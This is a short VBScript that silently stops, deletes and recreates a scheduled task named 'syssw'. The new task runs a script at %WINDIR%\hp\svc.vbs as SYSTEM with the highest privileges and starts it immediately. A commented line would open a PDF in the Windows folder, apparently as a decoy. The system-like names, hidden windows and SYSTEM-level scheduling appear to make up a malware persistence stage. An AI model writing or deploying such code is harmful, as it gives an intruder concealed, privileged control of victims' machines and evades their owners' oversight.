Set oShell = CreateObject ("WScript.Shell") 
windir = oShell.ExpandEnvironmentStrings( "%WINDIR%" )
strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )

With oShell
  .Run "schtasks /stop /tn syssw", 0, True
  .Run "schtasks /delete /tn syssw /F", 0, True
  '.Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY /ST " & DateAdd("s", 30, Now) & " /tr """ & windir & "\svc.vbs"" /tn syssw /rl highest /F", 0, True
  
  .Run "schtasks /create /ru ""SYSTEM"" /sc MONTHLY  /tr """ & windir & "\hp\svc.vbs"" /tn syssw /rl highest /F", 0, True
  .Run "schtasks /run /tn syssw", 0, True
  '.Run windir & "\file.pdf"
End With

Function XmlTime(t)
    Dim cSecond, cMinute, CHour, cDay, cMonth, cYear
    Dim tTime, tDate

    cSecond = "0" & Second(t)
    cMinute = "0" & Minute(t)
    cHour = "0" & Hour(t)
    cDay = "0" & Day(t)
    cMonth = "0" & Month(t)
    cYear = Year(t)

    tTime = Right(cHour, 2) & ":" & Right(cMinute, 2) & _
        ":" & Right(cSecond, 2)
    tDate = cYear & "-" & Right(cMonth, 2) & "-" & Right(cDay, 2)
    XmlTime = tDate & "T" & tTime 
End Function